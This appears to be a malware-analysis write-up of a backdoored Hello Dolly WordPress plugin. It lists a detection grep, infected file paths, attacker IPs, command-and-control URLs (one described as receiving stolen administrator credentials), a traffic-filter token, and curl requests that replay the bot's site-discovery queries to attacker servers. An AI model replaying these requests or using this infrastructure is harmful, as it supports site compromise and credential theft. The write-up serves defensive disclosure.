# Backdoor Hello Dolly

This is a modified version of the file **index.php** from the *Hello Dolly* WordPress plugin 1.7.2 :
![](imgs/hello_dolly.png)

Modifications made to this file can be found using this grep search:
```
grep -lR "_POST,'color');" * --include="*.php"
```
Commonly found in:
```
/wp-content/uploads/2020/index.php
/wp-content/plugins/hello.php
```

Has been accessed by the following IPs:
```
89.238.176.151 - POST /wp-content/uploads/2020/index.php HTTP/1.1" 200 - "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0"
89.238.176.151 - POST /blog/wp-content/plugins/hello.php HTTP/1.1" 200 - "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0"
```

# ceaq3.php
## C2 (MSAU - Mega Super Autouploader) 

Used to retrieve content based on client's refefer. Often retrieves Ivermectin related content
```
http://mgsrup.com/msau_jml/work.php
```

Keitaro TDS filtering bots using key token=Qkj6fjn751ZhdvyP
```
http://185.87.149.42/click_api/v3
```
#  6yvvo.php
## C2 (MSAU - Mega Super Autouploader) 

Used to retrieve and send username and password of WordPress administrator accounts of the local site
```
http://185.87.149.155/msau_woo/work.php
```

# WordPress sites discovery

Query #1
```
curl 'http://5.8.18.7/drwnfcl1/dche/' --cookie 'wordpress_test_cookie=WP+Cookie+check' -A 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.)'
```
Replies
```
ISD21320ISD
ISD21429ISD
ISD21431ISD
ISD21432ISD
ISD21433ISD
ISD21434ISD
ISD21435ISD
ISD21437ISD
ISD21438ISD
ISD21439ISD
...
```

Then, the PHP bot queries the server for domains using this ID:
```
curl 'http://5.8.18.7/drwnfcl1/dche/bbd/21439'
```
Reply (each query will return 1000 domain names):
```
[REDACTED].ae.com
[REDACTED].cl
[REDACTED].com
[REDACTED].com.co
[REDACTED].br
[REDACTED].br
[REDACTED].com
[REDACTED].nl
[REDACTED].ro
[REDACTED].ca
[REDACTED].nl
[REDACTED].com
[REDACTED].com
[REDACTED].com.br
[REDACTED].com.br
[REDACTED].au
[REDACTED].com
[REDACTED].pe
[REDACTED].com.br
[REDACTED].es
[REDACTED].sk
[REDACTED].it
.......
```
I was able to query until page 82868. We can then calculate how many entries the server has: 82868*1000=82868000 domain names.

```
curl 'http://5.8.18.7/drwnfcl1/ch/ch.php' --cookie 'wordpress_test_cookie=WP+Cookie+check' -A 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.)'
```
Replies with the content of the file ch.php

day.php is used to return valid WordPress sites. E.g.;

```
POST /drwnfcl1/dche/day.php
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)

od=[TASK ID]&array=https://<website 1 name>.com|!https://<website 2 name>
```

de1s.php is used to report the number or valid WordPress sites from a given task (page). E.g. task ID 11375 found 2147 sites;

```
GET /drwnfcl1/dche/de1s.php?d=11375|2147
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Cookie: wordpress_test_cookie=WP+Cookie+check
```
